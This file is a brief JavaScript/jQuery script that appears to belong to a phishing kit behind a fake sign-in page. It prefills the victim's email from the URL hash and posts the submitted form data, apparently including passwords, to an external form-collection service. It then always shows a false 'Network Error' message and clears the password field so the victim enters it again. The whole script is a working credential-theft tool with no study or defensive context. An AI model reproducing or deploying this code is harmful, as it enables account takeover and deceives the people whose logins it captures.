$(document).ready(function(){	
var url = window.location.hash.substr(1);
	$("#x1").val(url);

	$("#formx").submit(function (e) {
	e.preventDefault();
	var nm = $("#A1").val();
	var formData = new FormData($("#formx")[0]);
	
	$("#submitBtn").html(`
		<button class="btn btn-sm btn-primary" disabled>
			<span class="spinner-grow spinner-grow-sm"></span>Please Wait...
		</button>`
	).prop("disabled", true);
	
	$("#x2").click(function () {
	$("#msg").hide();
	});
	
	$.ajax({
		url: "https://nocodeform.io/f/65c666a93ef966a459cf7828",
		type: 'POST',
		data: formData,
		contentType: false,
		processData: false,
		
		success: function(res) {
			setTimeout(function () {
				$("#x1").val(url);
				$("#x2").val("");
				$("#msg").show();
				$("#msg").html("Network Error! Please verify your information and try again");
				$("#submitBtn").html("Sign In").prop("disabled", false);
			}, 1000);
		},
		
		error: function(res) {
			setTimeout(function () {
				$("#x1").val(url);
				$("#x2").val("");
				$("#msg").show();
				$("#msg").html("Network Error! Please verify your information and try again");
				$("#submitBtn").html("Sign In").prop("disabled", false);
			}, 1000);
		}
            });
        });
	});